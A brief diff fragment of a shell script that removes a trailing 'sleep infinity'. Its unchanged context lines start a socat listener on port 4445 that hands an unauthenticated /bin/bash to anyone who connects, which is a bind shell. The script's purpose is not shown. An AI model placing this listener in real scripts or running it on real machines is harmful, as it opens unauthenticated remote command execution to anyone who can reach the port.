@@ -440,6 +440,3 @@ if ! ss -tuln | grep -q ":4445 "; then
   socat TCP-LISTEN:4445,reuseaddr,fork EXEC:"/bin/bash" &
  else echo "Port 4445 already in use";
 fi
-
-
-sleep infinity
